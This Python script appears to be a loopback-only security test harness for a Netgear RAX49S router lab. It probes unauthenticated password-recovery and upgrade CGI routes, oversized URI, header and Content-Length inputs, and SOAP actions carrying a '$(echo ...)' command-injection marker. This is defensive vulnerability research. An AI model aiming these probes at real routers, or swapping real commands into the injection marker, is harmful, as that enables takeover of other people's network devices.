#!/usr/bin/env python3
"""Bounded loopback-only pre-auth HTTP/SOAP checks for the RAX49S lab."""

from __future__ import annotations

import argparse
import socket
import ssl
import time


HOST = "127.0.0.1"
DEFAULT_PORT = 25_149


def exchange(port: int, payload: bytes, timeout: float = 5.0) -> bytes:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers("ALL:@SECLEVEL=0")
    with socket.create_connection((HOST, port), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname="routerlogin.net") as client:
            client.sendall(payload)
            response = bytearray()
            while chunk := client.recv(65536):
                response.extend(chunk)
            return bytes(response)


def request(path: str, method: str = "GET", body: bytes = b"", extra: bytes = b"") -> bytes:
    return (
        f"{method} {path} HTTP/1.1\r\n".encode()
        + b"Host: routerlogin.net\r\n"
        + extra
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )


def status(response: bytes) -> str:
    return response.splitlines()[0].decode(errors="replace") if response else "empty"


def body(response: bytes) -> bytes:
    return response.partition(b"\r\n\r\n")[2]


def healthy(port: int) -> bool:
    try:
        return status(exchange(port, request("/currentsetting.htm"))).startswith("HTTP/")
    except (OSError, ssl.SSLError):
        return False


def route_matrix(port: int) -> int:
    cases = (
        ("current-setting", "/currentsetting.htm", "GET", b""),
        ("unauth", "/unauth.cgi", "GET", b""),
        ("security-questions", "/securityquestions.cgi", "GET", b""),
        ("password-recovered", "/passwordrecovered.cgi", "GET", b""),
        ("brs-index", "/BRS_index.htm", "GET", b""),
        ("recover-empty", "/recover.cgi", "POST", b""),
        ("security-questions-empty", "/securityquestions.cgi", "POST", b""),
    )
    for name, path, method, payload in cases:
        try:
            response = exchange(port, request(path, method, payload))
            result = status(response)
            size = len(body(response))
        except (OSError, ssl.SSLError) as error:
            result = f"{type(error).__name__}: {error}"
            size = 0
        alive = healthy(port)
        print(f"{name}: response={result!r} body_bytes={size} service_alive={str(alive).lower()}")
        if not alive:
            return 2
    return 0


def boundary_matrix(port: int) -> int:
    cases: list[tuple[str, bytes]] = []
    for size in (1024, 4096, 8192, 16384):
        cases.append((f"uri-{size}", request("/" + ("A" * size))))
    for size in (1024, 4096, 8192, 16384):
        cases.append((
            f"header-{size}",
            request("/currentsetting.htm", extra=b"X-Friday: " + (b"B" * size) + b"\r\n"),
        ))
    cases.extend((
        (
            "negative-content-length",
            b"POST /unauth.cgi HTTP/1.1\r\nHost: routerlogin.net\r\n"
            b"Content-Length: -1\r\nConnection: close\r\n\r\n",
        ),
        (
            "overflow-content-length",
            b"POST /unauth.cgi HTTP/1.1\r\nHost: routerlogin.net\r\n"
            b"Content-Length: 18446744073709551615\r\nConnection: close\r\n\r\n",
        ),
    ))
    for name, payload in cases:
        try:
            response = exchange(port, payload)
            result = status(response)
        except (OSError, ssl.SSLError) as error:
            result = f"{type(error).__name__}: {error}"
        time.sleep(0.25)
        alive = healthy(port)
        print(f"{name}: response={result!r} service_alive={str(alive).lower()}")
        if not alive:
            return 2
    return 0


def soap_matrix(port: int) -> int:
    urn = "urn:NETGEAR-ROUTER:service"
    marker = "$(echo FRIDAY_RAX30_RCE_MARKER)"
    cases = (
        (
            "soap-login-empty",
            f"{urn}:DeviceConfig:1#SOAPLogin",
            f'<m:SOAPLogin xmlns:m="{urn}:DeviceConfig:1"/>',
        ),
        (
            "set-ntp-marker",
            f"{urn}:DeviceConfig:1#SetNTP",
            f'<m:SetNTP xmlns:m="{urn}:DeviceConfig:1">'
            f"<NewNTPServer1>{marker}</NewNTPServer1></m:SetNTP>",
        ),
        (
            "firmware-url-marker",
            f"{urn}:DeviceConfig:1#CheckAndDownloadNewFirmware",
            f'<m:CheckAndDownloadNewFirmware xmlns:m="{urn}:DeviceConfig:1">'
            f"<NewFirmwareURL>{marker}</NewFirmwareURL>"
            "</m:CheckAndDownloadNewFirmware>",
        ),
    )
    for name, action, envelope_body in cases:
        envelope = (
            '<?xml version="1.0"?>'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            f"<s:Body>{envelope_body}</s:Body></s:Envelope>"
        ).encode()
        response = exchange(
            port,
            request(
                "/soap/server_sa/",
                "POST",
                envelope,
                extra=(
                    b'Content-Type: text/xml; charset="utf-8"\r\n'
                    + f'SOAPAction: "{action}"\r\n'.encode()
                ),
            ),
        )
        response_body = body(response)
        summary = response_body[:240].decode(errors="replace").replace("\r", " ").replace("\n", " ")
        alive = healthy(port)
        print(
            f"{name}: response={status(response)!r} body_bytes={len(response_body)} "
            f"body_prefix={summary!r} service_alive={str(alive).lower()}"
        )
        if not alive:
            return 2
    return 0


def factory_setup_matrix(port: int) -> int:
    marker = b"FRIDAY_RAX49S_FACTORY_MARKER"
    cases = (
        ("unauth-id", "/unauth.cgi?id=" + ("A" * 64), b""),
        ("serial", "/securityquestions.cgi", b"serialNumber=" + marker + b"&Continue=Continue"),
        (
            "answers",
            "/passwordrecovered.cgi",
            b"answer1=" + marker + b"&answer2=" + marker + b"&Continue=Continue",
        ),
        (
            "password-reset-shaped",
            "/passwordrecovered.cgi",
            b"sysNewPasswd=" + marker + b"&sysConfirmPasswd=" + marker
            + b"&answer1=x&answer2=y&next=submit",
        ),
        (
            "upgrade-check-shaped",
            "/upgrade_check.cgi",
            b"filename=" + marker + b"&buttonHit=Upload&buttonValue=Upload",
        ),
    )
    for name, path, payload in cases:
        try:
            response = exchange(
                port,
                request(
                    path,
                    "POST",
                    payload,
                    extra=b"Content-Type: application/x-www-form-urlencoded\r\n",
                ),
            )
            result = status(response)
            size = len(body(response))
        except (OSError, ssl.SSLError) as error:
            result = f"{type(error).__name__}: {error}"
            size = 0
        alive = healthy(port)
        print(f"{name}: response={result!r} body_bytes={size} service_alive={str(alive).lower()}")
        if not alive:
            return 2
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument(
        "--mode", choices=("routes", "boundaries", "soap", "factory", "all"), default="all"
    )
    args = parser.parse_args()
    modes = ("routes", "boundaries", "soap", "factory") if args.mode == "all" else (args.mode,)
    for mode in modes:
        result = {
            "routes": route_matrix,
            "boundaries": boundary_matrix,
            "soap": soap_matrix,
            "factory": factory_setup_matrix,
        }[mode](args.port)
        if result:
            return result
    print(f"final_health={'pass' if healthy(args.port) else 'fail'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
